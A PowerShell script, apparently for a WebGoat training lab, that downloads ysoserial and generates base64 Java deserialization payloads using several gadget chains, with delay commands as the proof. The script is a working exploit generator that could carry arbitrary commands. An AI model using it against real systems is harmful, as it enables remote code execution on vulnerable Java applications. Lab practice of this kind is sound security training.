# ============================================================
# Download and Use ysoserial for Deserialization Attack
# ============================================================

$ysoserialUrl = "https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar"
$ysoserialPath = "c:\webgoat-scripts-1\ysoserial-all.jar"

Write-Host "=====================================" -ForegroundColor Cyan
Write-Host "ysoserial Payload Generator" -ForegroundColor Cyan
Write-Host "=====================================" -ForegroundColor Cyan
Write-Host ""

# Check if ysoserial already exists
if (Test-Path $ysoserialPath) {
    Write-Host "[INFO] ysoserial-all.jar already exists" -ForegroundColor Green
} else {
    Write-Host "[INFO] Downloading ysoserial..." -ForegroundColor Yellow
    try {
        Invoke-WebRequest -Uri $ysoserialUrl -OutFile $ysoserialPath
        Write-Host "[SUCCESS] Downloaded ysoserial-all.jar" -ForegroundColor Green
    } catch {
        Write-Host "[ERROR] Failed to download ysoserial: $_" -ForegroundColor Red
        Write-Host ""
        Write-Host "Please download manually from:" -ForegroundColor Yellow
        Write-Host "https://github.com/frohoff/ysoserial/releases" -ForegroundColor Cyan
        Write-Host ""
        exit 1
    }
}

Write-Host ""
Write-Host "=====================================" -ForegroundColor Cyan
Write-Host "Generating Payloads" -ForegroundColor Cyan
Write-Host "=====================================" -ForegroundColor Cyan
Write-Host ""

# Generate payload with different gadget chains
$gadgetChains = @(
    @{Name = "CommonsCollections6"; Command = "timeout /t 5"},
    @{Name = "CommonsCollections6"; Command = "ping -n 6 127.0.0.1"},
    @{Name = "CommonsCollections5"; Command = "timeout /t 5"},
    @{Name = "Spring1"; Command = "timeout /t 5"}
)

$index = 1
foreach ($chain in $gadgetChains) {
    Write-Host "[$index] Gadget Chain: $($chain.Name)" -ForegroundColor Yellow
    Write-Host "    Command: $($chain.Command)" -ForegroundColor Gray
    Write-Host ""
    
    try {
        # Generate payload using java directly to stdout
        $javaArgs = @("-jar", $ysoserialPath, $chain.Name, $chain.Command)
        
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = "java"
        $psi.Arguments = $javaArgs -join " "
        $psi.RedirectStandardOutput = $true
        $psi.RedirectStandardError = $true
        $psi.UseShellExecute = $false
        $psi.CreateNoWindow = $true
        
        $process = New-Object System.Diagnostics.Process
        $process.StartInfo = $psi
        $process.Start() | Out-Null
        
        # Read binary output
        $outputStream = $process.StandardOutput.BaseStream
        $memoryStream = New-Object System.IO.MemoryStream
        $outputStream.CopyTo($memoryStream)
        $process.WaitForExit()
        
        $bytes = $memoryStream.ToArray()
        $memoryStream.Close()
        
        if ($bytes.Length -gt 0) {
            $base64 = [Convert]::ToBase64String($bytes)
            
            Write-Host "    Generated Payload (base64):" -ForegroundColor Green
            Write-Host "    $base64" -ForegroundColor White
            Write-Host ""
            Write-Host "    Length: $($base64.Length) characters" -ForegroundColor Gray
            Write-Host ""
            
            # Save to file with safe name
            $safeName = "payload_$($index)_$($chain.Name).txt"
            $outputFile = Join-Path "c:\webgoat-scripts-1" $safeName
            $base64 | Out-File -FilePath $outputFile -Encoding ASCII -NoNewline
            Write-Host "    Saved to: $safeName" -ForegroundColor Cyan
            Write-Host ""
            
        } else {
            Write-Host "    [ERROR] No payload generated" -ForegroundColor Red
            $errorOutput = $process.StandardError.ReadToEnd()
            if ($errorOutput) {
                Write-Host "    Error: $errorOutput" -ForegroundColor Red
            }
        }
        
    } catch {
        Write-Host "    [ERROR] $($_.Exception.Message)" -ForegroundColor Red
    }
    
    Write-Host "-----------------------------------" -ForegroundColor DarkGray
    Write-Host ""
    $index++
}

Write-Host "=====================================" -ForegroundColor Cyan
Write-Host "Next Steps" -ForegroundColor Cyan
Write-Host "=====================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "1. Copy one of the base64 payloads above" -ForegroundColor White
Write-Host "2. Paste it into the WebGoat input box" -ForegroundColor White
Write-Host "3. Submit and wait for 5-second delay" -ForegroundColor White
Write-Host "4. Challenge should be complete!" -ForegroundColor White
Write-Host ""
Write-Host "Recommended: Try CommonsCollections6 with 'timeout /t 5' first" -ForegroundColor Yellow
Write-Host ""

# Clean up error file
Remove-Item "c:\webgoat-scripts-1\error.txt" -ErrorAction SilentlyContinue
